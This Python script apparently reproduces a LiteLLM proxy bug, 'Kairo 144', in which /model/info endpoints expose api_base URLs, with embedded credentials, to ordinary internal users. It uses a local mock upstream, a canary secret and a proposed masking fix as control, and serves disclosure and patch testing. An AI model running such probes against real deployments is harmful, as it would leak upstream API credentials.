"""Kairo 144 repro: /model/info (and /v1, /v2) return the deployment's api_base
unmasked to internal users, including credentials embedded in the URL.

Run from a litellm checkout at 6abacd329b7 with the proxy live on 127.0.0.1:4100
(master key via LITELLM_MASTER_KEY env var name only). The script seeds a mock
upstream, a deployment whose api_base embeds ?cred=CANARY-SECRET-ABCD, mints a
plain internal user key, and runs the N/N attack, the field-guard control, and
the fixed-build control.
"""
import json
import os
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

import httpx

BASE = os.environ.get("KAIRO144_PROXY", "http://127.0.0.1:4100")
MASTER = os.environ.get("LITELLM_MASTER_KEY", "")
CANARY = "CANARY-SECRET-ABCD"


def mock_upstream() -> None:
    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_POST(self):
            n = int(self.headers.get("Content-Length", 0))
            self.rfile.read(n)
            body = json.dumps(
                {
                    "id": "chatcmpl-canary", "object": "chat.completion", "created": 1,
                    "model": "gpt-4o",
                    "choices": [{"index": 0, "message": {"role": "assistant", "content": "MOCK-CANARY-OK"}, "finish_reason": "stop"}],
                    "usage": {"prompt_tokens": 10, "completion_tokens": 5, "total_tokens": 15},
                }
            ).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        do_GET = do_POST

    HTTPServer(("127.0.0.1", 9555), H).serve_forever()


def main() -> int:
    threading.Thread(target=mock_upstream, daemon=True).start()
    M = httpx.Client(base_url=BASE, headers={"Authorization": f"Bearer {MASTER}"}, timeout=30)
    r = M.post(
        "/model/new",
        json={
            "model_name": "cred-model",
            "litellm_params": {"model": "openai/gpt-4o", "api_base": f"http://127.0.0.1:9555/v1?cred={CANARY}", "api_key": "sk-cred-canary-9999"},
        },
    )
    assert r.status_code == 200, r.text
    r = M.post("/user/new", json={"user_id": "u-repro", "user_role": "internal_user"})
    assert r.status_code == 200, r.text
    r = M.post("/key/generate", json={"key_alias": "repro-internal-key", "user_id": "u-repro"})
    key = r.json()["key"]
    C = httpx.Client(base_url=BASE, headers={"Authorization": f"Bearer {key}"}, timeout=15)

    hits = 0
    for path in ("/model/info", "/v1/model/info", "/v2/model/info"):
        ok = 0
        for _ in range(5):
            r = C.get(path)
            if CANARY in r.text:
                ok += 1
        leaked = any(CANARY in C.get(path).text for _ in range(1))
        print(f"{path:18} leaked {ok}/5, final probe leaked={leaked}")
        hits += ok
    item = C.get("/model/info").json()["data"][0]["litellm_params"]
    print("control A - api_key popped:", "api_key" not in item, "| api_base:", item["api_base"])

    from litellm.proxy.common_utils.openai_endpoint_utils import remove_sensitive_info_from_deployment
    from litellm.litellm_core_utils.sensitive_data_masker import SensitiveDataMasker

    deployment = {
        "model_name": "cred-model",
        "litellm_params": {"model": "openai/gpt-4o", "api_base": f"http://127.0.0.1:9555/v1?cred={CANARY}", "api_key": "sk-cred-canary-9999"},
        "model_info": {"id": "x"},
    }
    current = remove_sensitive_info_from_deployment(json.loads(json.dumps(deployment)))
    print("control B(current) - api_base:", current["litellm_params"]["api_base"][:60], "| leaks:", CANARY in current["litellm_params"]["api_base"])
    fixed_masker = SensitiveDataMasker(extra_sensitive_patterns={"base"})
    fixed = json.loads(json.dumps(deployment))
    fixed["litellm_params"].pop("api_key", None)
    fixed["litellm_params"]["api_base"] = fixed_masker.mask_value(fixed["litellm_params"]["api_base"])
    print("control B(fixed)   - api_base:", fixed["litellm_params"]["api_base"][:40], "| leaks:", CANARY in fixed["litellm_params"]["api_base"])

    total_attack = hits  # 3 paths x 5 runs
    ok = total_attack == 15 and "api_key" not in item and CANARY not in fixed["litellm_params"]["api_base"]
    print("OVERALL:", "PASS" if ok else "FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
